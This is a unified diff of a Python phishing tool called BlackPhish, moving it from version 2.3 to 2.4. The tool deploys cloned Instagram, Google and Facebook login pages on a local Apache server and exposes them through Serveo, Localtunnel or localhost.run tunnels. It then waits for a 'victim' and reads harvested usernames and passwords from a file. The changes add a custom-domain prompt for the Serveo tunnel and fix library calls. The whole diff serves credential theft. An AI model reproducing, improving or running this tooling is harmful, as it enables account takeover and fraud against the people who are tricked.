@@ -10,7 +10,7 @@
 
 
 
-# version 2.3: - Bug fixes
+# version 2.4: - Small adjustments - Allow custom domain names
 
 # Please update version number each time we update
 
@@ -70,7 +70,7 @@ def warning(): # Banner #
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v2.3
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v2.4
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
@@ -104,9 +104,11 @@ def checkInternet(): # Checks for internet connection #
     
 # Port forward to Serveo #
 def serveoForward():
-    print(yellow + ' If prompt about RSA key, say yes' + green)
+    name = input(yellow + "\nCustom Domain Name(don't need www. or domain extension): ")
+    port = input(yellow + "\nPort(recommend 80): ")
+    print(yellow + '\n If prompt about RSA key, say yes' + green)
     sleep(2)
-    system('ssh -o ServerAliveInterval=60 -R inc0gnit0:80:localhost:80 serveo.net')
+    system('ssh -o ServerAliveInterval=60 -R ' + name + ':80:localhost:80 serveo.net')
 
 
 
@@ -160,7 +162,7 @@ def banner():
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v2.3
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v2.4
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
@@ -199,15 +201,15 @@ def main():
 
     system("clear") # clear screen #
     
-    checkInternet() # Check internet connection line:107 #
+    checkInternet() # Check internet connection #
     
-    warning() # Agree to use with responsibily line:58 #
+    warning() # Agree to use with responsibily #
 
     system('clear') # clear screen #
     
     banner() # Load Banner #
 
-    choice = input(red + "        [BlackPhish] -> ") # Get user input #
+    choice = input(red + "        [" + blue + "BlackPhish" + red + "] -> ") # Get user input #
 
 
 
@@ -218,7 +220,7 @@ def main():
         print(red + '           [2]' + blue + ' Localtunnel')
         print(red + '           [3]' + blue + ' localhost.run')
         print(red + '           [4]' + blue + ' Localhost only\n\n')
-        choice1 = input(red + "        [BlackPhish-Google] -> ")
+        choice1 = input(red + "        [" + blue + "BlackPhish-Instagram" + red + "] -> ")
         
         
         
@@ -233,10 +235,10 @@ def main():
             print(green + '[+] Cleaning /Server/www/')
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.dir_util.copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
-            redirect() # Redirect Prompt line:145 #
+            dir_util.copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
+            redirect() # Redirect Prompt #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
             sleep(0.1)
             system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
@@ -247,10 +249,10 @@ def main():
             system('service apache2 start') # Starts apache2 service #
             print(green + '[+] Apache2 Service Started')
             sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
+            print(blue + "\nLocal: " + red + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Serveo')
-            serveoForward() # Serveo port forward line:120 #
+            serveoForward() # Serveo port forward #
             print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
             sleep(0.1)
             while True: # Waits for content on usernames.txt #
@@ -273,10 +275,10 @@ def main():
             print(green + '[+] Cleaning /Server/www/')
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.dir_util.copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
-            redirect() # Redirect Prompt line:145 #
+            dir_util.copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
+            redirect() # Redirect Prompt #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
             sleep(0.1)
             system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
@@ -290,7 +292,7 @@ def main():
             print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Localtunnel')
-            localTunnel() # Localtunnel port forward line:128 #
+            localTunnel() # Localtunnel port forward #
             print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
             sleep(0.1)
             while True: # Waits for content on usernames.txt #
@@ -313,10 +315,10 @@ def main():
             print(green + '[+] Cleaning /Server/www/')
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.dir_util.copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
-            redirect() # Redirect Prompt line:145 #
+            dir_util.copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
+            redirect() # Redirect Prompt #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
             sleep(0.1)
             system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
@@ -330,7 +332,7 @@ def main():
             print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Localhost.run')
-            localhost() # Localhost.run port forward line:134 #
+            localhost() # Localhost.run port forward #
             while True: # Waits for content on usernames.txt #
                 with open('/var/www/html/usernames.txt') as creds:
                     lines = creds.read().rstrip()
@@ -351,10 +353,10 @@ def main():
             print(green + '[+] Cleaning /Server/www/')
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.dir_util.copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
-            redirect() # Redirect Prompt line:145 #
+            dir_util.copy_tree("Websites/Instagram", "Server/www") # Copies the entire folder of Websites/Instagram to /Server/www #
+            redirect() # Redirect Prompt #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
+            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
             sleep(0.1)
             system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
@@ -393,7 +395,7 @@ def main():
         print(red + '           [2]' + blue + ' Localtunnel')
         print(red + '           [3]' + blue + ' localhost.run')
         print(red + '           [4]' + blue + ' Localhost only\n\n')
-        choice1 = input(red + "        [BlackPhish-Google] -> ")
+        choice1 = input(red + "        [" + blue + "BlackPhish-Google" + red + "] -> ")
 
         if choice1 == '1':
             system("clear")
@@ -406,7 +408,7 @@ def main():
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
             dir_util.copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
-            redirect() # Redirect Prompt line:145 #
+            redirect() # Redirect Prompt #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
             dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
@@ -422,7 +424,7 @@ def main():
             print(yellow + "\n[*] Local hosted: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Serveo')
-            serveoForward() # Serveo port forward line:120 #
+            serveoForward() # Serveo port forward #
             print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
             sleep(0.1)
             while True:
@@ -446,7 +448,7 @@ def main():
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
             dir_util.copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
-            redirect() # Redirect Prompt line:145 #
+            redirect() # Redirect Prompt #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
             dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
@@ -462,7 +464,7 @@ def main():
             print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Localtunnel')
-            localTunnel() # Localtunnel port forward line:128 #
+            localTunnel() # Localtunnel port forward #
             print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
             sleep(0.1)
             while True: # Waits for content on usernames.txt #
@@ -486,7 +488,7 @@ def main():
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
             dir_util.copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
-            redirect() # Redirect Prompt line:145 #
+            redirect() # Redirect Prompt #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
             dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
@@ -502,7 +504,7 @@ def main():
             print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Localhost.run')
-            localhost() # Localhost.run port forward line:134 #
+            localhost() # Localhost.run port forward #
             print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
             sleep(0.1)
             while True: # Waits for content on usernames.txt #
@@ -526,7 +528,7 @@ def main():
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
             dir_util.copy_tree("Websites/Google", "Server/www") # Copies the entire folder of Websites/Google to /Server/www #
-            redirect() # Redirect Prompt line:145 #
+            redirect() # Redirect Prompt #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
             dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
@@ -567,7 +569,7 @@ def main():
         print(red + '           [2]' + blue + ' Localtunnel')
         print(red + '           [3]' + blue + ' localhost.run')
         print(red + '           [4]' + blue + ' Localhost only\n\n')
-        choice1 = input(red + "        [BlackPhish-Facebook] -> ")
+        choice1 = input(red + "        [" + blue + "BlackPhish-Facebook" + red + "] -> ")
         
         if choice1 == '1':
             system("clear")
@@ -580,7 +582,7 @@ def main():
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
             dir_util.copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
-            redirect() # Redirect Prompt line:145 #
+            redirect() # Redirect Prompt #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
             dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
@@ -596,7 +598,7 @@ def main():
             print(yellow + "\n[*] Local hosted: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Serveo')
-            serveoForward() # Serveo port forward line:120 #
+            serveoForward() # Serveo port forward #
             print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
             sleep(0.1)
             while True:
@@ -620,7 +622,7 @@ def main():
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
             dir_util.copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
-            redirect() # Redirect Prompt line:145 #
+            redirect() # Redirect Prompt #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
             dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
@@ -636,7 +638,7 @@ def main():
             print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Localtunnel')
-            localTunnel() # Localtunnel port forward line:128 #
+            localTunnel() # Localtunnel port forward #
             print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
             sleep(0.1)
             while True: # Waits for content on usernames.txt #
@@ -660,7 +662,7 @@ def main():
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
             dir_util.copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
-            redirect() # Redirect Prompt line:145 #
+            redirect() # Redirect Prompt #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
             dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
@@ -676,7 +678,7 @@ def main():
             print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Localhost.run')
-            localhost() # Localhost.run port forward line:134 #
+            localhost() # Localhost.run port forward #
             print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
             sleep(0.1)
             while True: # Waits for content on usernames.txt #
@@ -700,7 +702,7 @@ def main():
             sleep(0.1)
             system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
             dir_util.copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
-            redirect() # Redirect Prompt line:145 #
+            redirect() # Redirect Prompt #
             print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
             dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
             print(green + '[+] Copying to /var/www/html')
